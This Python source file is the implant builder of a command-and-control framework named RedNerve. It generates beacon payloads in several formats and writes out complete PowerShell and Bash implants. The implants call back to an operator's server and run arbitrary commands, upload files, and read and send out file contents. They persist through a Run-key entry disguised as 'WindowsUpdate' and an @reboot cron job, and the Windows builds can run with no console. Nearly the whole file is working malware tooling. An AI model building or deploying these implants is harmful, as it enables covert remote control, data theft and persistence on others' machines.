"""
Implant Builder — Generates customized beacon payloads.

Supports:
  - Python (.py) — portable, requires Python on target
  - PowerShell (.ps1) — Windows native, no dependencies
  - Bash (.sh) — Linux/macOS native
  - Executable (.exe) — compiled Python via PyInstaller (Windows)
  - ELF binary — compiled Python via PyInstaller (Linux)
"""
from __future__ import annotations

import os
import uuid
import shutil
import subprocess
from pathlib import Path
from typing import Optional


BUILD_DIR = Path(__file__).parent.parent / "builds"
BUILD_DIR.mkdir(exist_ok=True)


def build_implant(config: dict) -> dict:
    build_id = str(uuid.uuid4())[:8]
    fmt = config.get("format", "py")

    generators = {
        "py": _generate_python,
        "ps1": _generate_powershell,
        "sh": _generate_bash,
        "exe": _generate_exe,
        "elf": _generate_elf,
    }

    generator = generators.get(fmt)
    if not generator:
        raise ValueError("Unsupported format: " + fmt)

    result = generator(build_id, config)
    result["build_id"] = build_id
    return result


def _generate_python(build_id: str, config: dict) -> dict:
    code = _python_beacon_code(config)
    filename = "beacon_" + build_id + ".py"
    filepath = BUILD_DIR / filename
    with open(filepath, "w") as f:
        f.write(code)
    return {"filename": filename, "path": str(filepath), "size": os.path.getsize(filepath)}


def _generate_powershell(build_id: str, config: dict) -> dict:
    server = config.get("server", "http://127.0.0.1:9999")
    secret = config.get("secret", "")
    interval = config.get("interval", 5)
    jitter = config.get("jitter", 10)
    sleep_time = config.get("sleep", 0)
    auto_persist = config.get("auto_persist", False)
    kill_date = config.get("kill_date", "")

    code = PS1_TEMPLATE
    code = code.replace("__BUILD_ID__", build_id)
    code = code.replace("__C2_SERVER__", server)
    code = code.replace("__SECRET__", secret)
    code = code.replace("__INTERVAL__", str(interval))
    code = code.replace("__JITTER__", str(jitter))

    extra_init = ""
    if sleep_time > 0:
        extra_init += "Start-Sleep -Seconds " + str(sleep_time) + "\n"
    if kill_date:
        extra_init += '$KillDate = [datetime]::Parse("' + kill_date + '")\n'
        extra_init += 'if ((Get-Date) -gt $KillDate) { exit }\n'
    if auto_persist:
        extra_init += PS1_PERSIST_BLOCK

    code = code.replace("__EXTRA_INIT__", extra_init)

    kill_check = ""
    if kill_date:
        kill_check = 'if ((Get-Date) -gt $KillDate) { exit }'
    code = code.replace("__KILL_CHECK__", kill_check)

    filename = "beacon_" + build_id + ".ps1"
    filepath = BUILD_DIR / filename
    with open(filepath, "w") as f:
        f.write(code)
    return {"filename": filename, "path": str(filepath), "size": os.path.getsize(filepath)}


def _generate_bash(build_id: str, config: dict) -> dict:
    server = config.get("server", "http://127.0.0.1:9999")
    secret = config.get("secret", "")
    interval = config.get("interval", 5)
    jitter = config.get("jitter", 10)
    sleep_time = config.get("sleep", 0)
    auto_persist = config.get("auto_persist", False)
    kill_date = config.get("kill_date", "")

    code = BASH_TEMPLATE
    code = code.replace("__BUILD_ID__", build_id)
    code = code.replace("__C2_SERVER__", server)
    code = code.replace("__SECRET__", secret)
    code = code.replace("__INTERVAL__", str(interval))
    code = code.replace("__JITTER__", str(jitter))

    extra_init = ""
    if sleep_time > 0:
        extra_init += "sleep " + str(sleep_time) + "\n"
    if auto_persist:
        extra_init += BASH_PERSIST_BLOCK
    code = code.replace("__EXTRA_INIT__", extra_init)

    kill_check = ""
    if kill_date:
        kill_check = '[ "$(date +%Y-%m-%d)" \\> "' + kill_date + '" ] && exit 0'
    code = code.replace("__KILL_CHECK__", kill_check)

    filename = "beacon_" + build_id + ".sh"
    filepath = BUILD_DIR / filename
    with open(filepath, "w") as f:
        f.write(code)
    os.chmod(filepath, 0o755)
    return {"filename": filename, "path": str(filepath), "size": os.path.getsize(filepath)}


def _generate_exe(build_id: str, config: dict) -> dict:
    py_result = _generate_python(build_id, config)
    py_path = py_result["path"]
    exe_name = "beacon_" + build_id + ".exe"
    exe_dir = BUILD_DIR / ("exe_" + build_id)
    exe_dir.mkdir(exist_ok=True)
    try:
        cmd = [
            "pyinstaller", "--onefile", "--noconsole",
            "--distpath", str(exe_dir),
            "--workpath", str(exe_dir / "work"),
            "--specpath", str(exe_dir / "spec"),
            "--name", exe_name.replace(".exe", ""),
            py_path,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        exe_path = exe_dir / exe_name
        if exe_path.exists():
            final_path = BUILD_DIR / exe_name
            shutil.move(str(exe_path), str(final_path))
            shutil.rmtree(str(exe_dir), ignore_errors=True)
            return {"filename": exe_name, "path": str(final_path), "size": os.path.getsize(final_path)}
        else:
            raise RuntimeError("PyInstaller failed: " + result.stderr[:500])
    except FileNotFoundError:
        raise RuntimeError("PyInstaller not installed. Install with: pip install pyinstaller")
    finally:
        if exe_dir.exists():
            shutil.rmtree(str(exe_dir), ignore_errors=True)


def _generate_elf(build_id: str, config: dict) -> dict:
    py_result = _generate_python(build_id, config)
    py_path = py_result["path"]
    elf_name = "beacon_" + build_id
    elf_dir = BUILD_DIR / ("elf_" + build_id)
    elf_dir.mkdir(exist_ok=True)
    try:
        cmd = [
            "pyinstaller", "--onefile",
            "--distpath", str(elf_dir),
            "--workpath", str(elf_dir / "work"),
            "--specpath", str(elf_dir / "spec"),
            "--name", elf_name,
            py_path,
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        elf_path = elf_dir / elf_name
        if elf_path.exists():
            final_path = BUILD_DIR / elf_name
            shutil.move(str(elf_path), str(final_path))
            shutil.rmtree(str(elf_dir), ignore_errors=True)
            return {"filename": elf_name, "path": str(final_path), "size": os.path.getsize(final_path)}
        else:
            raise RuntimeError("PyInstaller failed: " + result.stderr[:500])
    except FileNotFoundError:
        raise RuntimeError("PyInstaller not installed. Install with: pip install pyinstaller")
    finally:
        if elf_dir.exists():
            shutil.rmtree(str(elf_dir), ignore_errors=True)


def _python_beacon_code(config: dict) -> str:
    server = config.get("server", "http://127.0.0.1:9999")
    secret = config.get("secret", "")
    interval = config.get("interval", 5)
    jitter = config.get("jitter", 10)
    sleep_time = config.get("sleep", 0)
    auto_persist = config.get("auto_persist", False)
    kill_date = config.get("kill_date", "")

    beacon_src = Path(__file__).parent.parent / "beacon" / "beacon.py"
    with open(beacon_src, "r") as f:
        template = f.read()

    header = '#!/usr/bin/env python3\n"""RedNerve Beacon — Auto-configured implant."""\n'
    header += "import os, sys, time\n\n"
    header += '_SERVER = "' + server + '"\n'
    header += '_SECRET = "' + secret + '"\n'
    header += '_INTERVAL = ' + str(interval) + '\n'
    header += '_JITTER = ' + str(jitter) + '\n'
    header += '_SLEEP = ' + str(sleep_time) + '\n'
    header += '_KILL_DATE = "' + kill_date + '"\n\n'

    if auto_persist:
        header += PYTHON_PERSIST_BLOCK + "\n"

    header += "if _SLEEP > 0:\n    time.sleep(_SLEEP)\n\n"

    if kill_date:
        header += "if _KILL_DATE:\n"
        header += "    from datetime import datetime\n"
        header += '    if datetime.now() > datetime.strptime(_KILL_DATE, "%Y-%m-%d"):\n'
        header += "        sys.exit(0)\n\n"

    header += 'sys.argv = [sys.argv[0], "--server", _SERVER, "--secret", _SECRET, "--interval", str(_INTERVAL)]\n\n'
    header += "# --- Beacon code ---\n"

    return header + template


def list_builds() -> list:
    builds = []
    for f in sorted(BUILD_DIR.iterdir()):
        if f.is_file() and f.name.startswith("beacon_"):
            builds.append({
                "filename": f.name,
                "size": f.stat().st_size,
                "created": f.stat().st_mtime,
            })
    return builds


def get_build_path(filename: str) -> Optional[str]:
    filepath = BUILD_DIR / filename
    if filepath.exists() and filepath.is_file():
        return str(filepath)
    return None


# ─── Templates (no f-strings, uses __PLACEHOLDER__ replacement) ──

PYTHON_PERSIST_BLOCK = '''
def _auto_persist():
    import platform
    script = os.path.abspath(sys.argv[0] if sys.argv[0] else __file__)
    if platform.system() == "Windows":
        import subprocess
        key = r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        subprocess.run(["reg", "add", key, "/v", "WindowsUpdate", "/t", "REG_SZ",
                        "/d", 'pythonw.exe "' + script + '"', "/f"],
                       capture_output=True, timeout=5)
    else:
        import subprocess
        cron_check = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if script not in cron_check.stdout:
            new_cron = cron_check.stdout.rstrip() + "\\n@reboot " + sys.executable + " " + script + " &\\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
try:
    _auto_persist()
except:
    pass
'''

PS1_PERSIST_BLOCK = '''
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$payloadPath = $MyInvocation.MyCommand.Path
if ($payloadPath -and !(Get-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -ep bypass -w hidden -f `\\"$payloadPath`\\""
}
'''

BASH_PERSIST_BLOCK = '''
SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || echo "$0")
if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
    (crontab -l 2>/dev/null; echo "@reboot $SCRIPT_PATH &") | crontab -
fi
'''

PS1_TEMPLATE = r'''# RedNerve Beacon — PowerShell Implant
# Build: __BUILD_ID__
$ErrorActionPreference = "SilentlyContinue"

$C2 = "__C2_SERVER__"
$Secret = "__SECRET__"
$Interval = __INTERVAL__
$Jitter = __JITTER__
$BeaconId = [guid]::NewGuid().ToString()
$Headers = @{ "X-Beacon-Secret" = $Secret; "Content-Type" = "application/json" }

function Get-SysInfo {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object -First 1).IPAddress
    if (-not $ip) { $ip = "127.0.0.1" }
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $integrity = if ($isAdmin) { "high" } else { "medium" }
    @{
        beacon_id    = $BeaconId
        hostname     = $env:COMPUTERNAME
        ip_address   = $ip
        os           = [System.Environment]::OSVersion.VersionString
        username     = "$env:USERDOMAIN\$env:USERNAME"
        domain       = $env:USERDOMAIN
        pid          = $PID
        process_name = (Get-Process -Id $PID).Path
        integrity    = $integrity
        metadata     = @{ arch = $env:PROCESSOR_ARCHITECTURE; powershell = $PSVersionTable.PSVersion.ToString() }
    }
}

function Invoke-Task($task) {
    $action = $task.action
    $params = $task.params
    $taskId = $task.task_id
    $result = @{ task_id = $taskId; status = "success"; data = @{}; error = $null }
    try {
        switch ($action) {
            "run_command" {
                $output = cmd.exe /c $params.command 2>&1
                $result.data = @{ stdout = ($output | Out-String); stderr = ""; exit_code = $LASTEXITCODE; command = $params.command }
            }
            "shell" {
                $output = cmd.exe /c $params.command 2>&1
                $result.data = @{ stdout = ($output | Out-String); stderr = ""; exit_code = $LASTEXITCODE; command = $params.command }
            }
            "powershell" {
                $output = Invoke-Expression $params.command 2>&1
                $result.data = @{ stdout = ($output | Out-String); stderr = ""; exit_code = 0; command = $params.command }
            }
            "upload_file" {
                Set-Content -Path $params.path -Value $params.content -Force
                $result.data = @{ path = $params.path; size = (Get-Item $params.path).Length; written = $true }
            }
            "download_file" {
                $content = Get-Content -Path $params.path -Raw
                $size = (Get-Item $params.path).Length
                $result.data = @{ path = $params.path; content = $content; size = $size; binary = $false }
            }
            "read_file" {
                $content = Get-Content -Path $params.path -Raw
                $size = (Get-Item $params.path).Length
                $result.data = @{ path = $params.path; content = $content; size = $size; binary = $false }
            }
            "system_info" {
                $result.data = Get-SysInfo
            }
            "process_list" {
                $procs = Get-Process | Select-Object Name, Id, CPU, WorkingSet64, Path | ForEach-Object {
                    @{ name = $_.Name; pid = $_.Id; cpu = $_.CPU; mem = $_.WorkingSet64; path = $_.Path }
                }
                $result.data = @{ processes = $procs; count = $procs.Count }
            }
            "network_info" {
                $ifaces = ipconfig /all | Out-String
                $conns = netstat -an | Out-String
                $result.data = @{ raw_interfaces = $ifaces; raw_connections = $conns }
            }
            "list_directory" {
                $path = if ($params.path) { $params.path } else { "." }
                $entries = Get-ChildItem -Path $path -Force | ForEach-Object {
                    @{ name = $_.Name; is_dir = $_.PSIsContainer; size = $_.Length; modified = $_.LastWriteTime.ToString("o") }
                }
                $result.data = @{ path = $path; entries = $entries; count = $entries.Count }
            }
            default {
                $result.status = "failure"
                $result.error = "Unknown action: $action"
            }
        }
    } catch {
        $result.status = "failure"
        $result.error = $_.Exception.Message
    }
    return $result
}

function Send-Json($url, $body) {
    $json = $body | ConvertTo-Json -Depth 10 -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $request = [System.Net.HttpWebRequest]::Create($url)
    $request.Method = "POST"
    $request.ContentType = "application/json"
    $request.Headers.Add("X-Beacon-Secret", $Secret)
    $request.Timeout = 65000
    $stream = $request.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $request.GetResponse()
    $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
    $text = $reader.ReadToEnd()
    $reader.Close()
    $response.Close()
    return $text | ConvertFrom-Json
}

__EXTRA_INIT__

# Register
$sysInfo = Get-SysInfo
while ($true) {
    try {
        Send-Json "$C2/api/beacon/register" $sysInfo | Out-Null
        Write-Host "[*] Registered as $BeaconId"
        break
    } catch {
        Write-Host "[!] Registration failed: $_"
        Start-Sleep -Seconds $Interval
    }
}

# Main loop
while ($true) {
    __KILL_CHECK__
    try {
        $resp = Send-Json "$C2/api/beacon/$BeaconId/checkin" @{}
        $tasks = $resp.tasks
        if ($tasks) {
            foreach ($task in $tasks) {
                Write-Host "[>] Task: $($task.task_id) - $($task.action)"
                $result = Invoke-Task $task
                Write-Host "[<] Result: $($result.status)"
                Send-Json "$C2/api/beacon/$BeaconId/result" $result | Out-Null
            }
        }
    } catch {
        Write-Host "[!] Error: $_"
    }
    $jitterMs = Get-Random -Minimum 0 -Maximum ([math]::Floor($Interval * 1000 * $Jitter / 100 + 1))
    Start-Sleep -Milliseconds ($Interval * 1000 + $jitterMs)
}
'''

BASH_TEMPLATE = r'''#!/bin/bash
# RedNerve Beacon — Bash Implant
# Build: __BUILD_ID__

C2="__C2_SERVER__"
SECRET="__SECRET__"
INTERVAL=__INTERVAL__
JITTER=__JITTER__
BEACON_ID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "$(hostname)-$$")

__EXTRA_INIT__

get_ip() {
    ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || \
    ifconfig 2>/dev/null | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1 || \
    echo "127.0.0.1"
}

get_integrity() {
    [ "$(id -u)" -eq 0 ] && echo "high" || echo "medium"
}

post_json() {
    curl -s -X POST "$1" \
        -H "Content-Type: application/json" \
        -H "X-Beacon-Secret: $SECRET" \
        -d "$2" \
        --connect-timeout 10 \
        --max-time 35 2>/dev/null
}

escape_json() {
    if command -v python3 &>/dev/null; then
        python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" <<< "$1"
    else
        printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g' | sed ':a;N;$!ba;s/\n/\\n/g'
    fi
}

handle_task() {
    local task_id="$1" action="$2" params="$3"
    local status="success" error="null"

    case "$action" in
        run_command|shell)
            local cmd
            cmd=$(echo "$params" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('command',''))" 2>/dev/null)
            local stdout stderr_file="/tmp/.rn_$$"
            stdout=$(eval "$cmd" 2>"$stderr_file")
            local ec=$?
            local stderr_out=$(cat "$stderr_file" 2>/dev/null)
            rm -f "$stderr_file"
            echo "{\"task_id\": \"$task_id\", \"status\": \"success\", \"data\": {\"stdout\": $(escape_json "$stdout"), \"stderr\": $(escape_json "$stderr_out"), \"exit_code\": $ec, \"command\": $(escape_json "$cmd")}, \"error\": null}"
            return
            ;;
        system_info)
            echo "{\"task_id\": \"$task_id\", \"status\": \"success\", \"data\": {\"hostname\": \"$(hostname)\", \"os\": \"$(uname -s) $(uname -r)\", \"username\": \"$(whoami)\", \"pid\": $$}, \"error\": null}"
            return
            ;;
        download_file|read_file)
            local fpath
            fpath=$(echo "$params" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('path',''))" 2>/dev/null)
            if [ -f "$fpath" ]; then
                local fsize
                fsize=$(stat -c%s "$fpath" 2>/dev/null || stat -f%z "$fpath" 2>/dev/null || echo 0)
                echo "{\"task_id\": \"$task_id\", \"status\": \"success\", \"data\": {\"path\": \"$fpath\", \"content\": $(escape_json "$(cat "$fpath")"), \"size\": $fsize, \"binary\": false}, \"error\": null}"
            else
                echo "{\"task_id\": \"$task_id\", \"status\": \"failure\", \"data\": {}, \"error\": \"File not found: $fpath\"}"
            fi
            return
            ;;
        upload_file)
            local fpath fcontent
            fpath=$(echo "$params" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('path',''))" 2>/dev/null)
            fcontent=$(echo "$params" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('content',''))" 2>/dev/null)
            echo "$fcontent" > "$fpath" 2>/dev/null
            local fsize
            fsize=$(stat -c%s "$fpath" 2>/dev/null || stat -f%z "$fpath" 2>/dev/null || echo 0)
            echo "{\"task_id\": \"$task_id\", \"status\": \"success\", \"data\": {\"path\": \"$fpath\", \"size\": $fsize, \"written\": true}, \"error\": null}"
            return
            ;;
        *)
            echo "{\"task_id\": \"$task_id\", \"status\": \"failure\", \"data\": {}, \"error\": \"Unknown action: $action\"}"
            return
            ;;
    esac
}

# Register
REG_DATA="{\"beacon_id\": \"$BEACON_ID\", \"hostname\": \"$(hostname)\", \"ip_address\": \"$(get_ip)\", \"os\": \"$(uname -s) $(uname -r)\", \"username\": \"$(whoami)\", \"domain\": \"$(dnsdomainname 2>/dev/null)\", \"pid\": $$, \"process_name\": \"$0\", \"integrity\": \"$(get_integrity)\"}"

while true; do
    RESP=$(post_json "$C2/api/beacon/register" "$REG_DATA")
    if [ $? -eq 0 ] && echo "$RESP" | grep -q "beacon_id"; then
        echo "[*] Registered as $BEACON_ID"
        break
    fi
    echo "[!] Registration failed, retrying..."
    sleep $INTERVAL
done

# Main loop
while true; do
    __KILL_CHECK__
    RESP=$(post_json "$C2/api/beacon/$BEACON_ID/checkin" "{}")

    if command -v python3 &>/dev/null; then
        echo "$RESP" | python3 -c "
import sys, json
try:
    data = json.loads(sys.stdin.read())
    for t in data.get('tasks', []):
        print(json.dumps(t))
except: pass
" 2>/dev/null | while IFS= read -r task_line; do
            [ -z "$task_line" ] && continue
            TASK_ID=$(echo "$task_line" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('task_id',''))")
            ACTION=$(echo "$task_line" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()).get('action',''))")
            PARAMS=$(echo "$task_line" | python3 -c "import sys,json; print(json.dumps(json.loads(sys.stdin.read()).get('params',{})))")
            echo "[>] Task: $TASK_ID — $ACTION"
            RESULT=$(handle_task "$TASK_ID" "$ACTION" "$PARAMS")
            echo "[<] Done"
            post_json "$C2/api/beacon/$BEACON_ID/result" "$RESULT" >/dev/null
        done
    fi

    JITTER_MS=$(( RANDOM % (INTERVAL * JITTER / 100 + 1) ))
    sleep $(( INTERVAL + JITTER_MS ))
done
'''
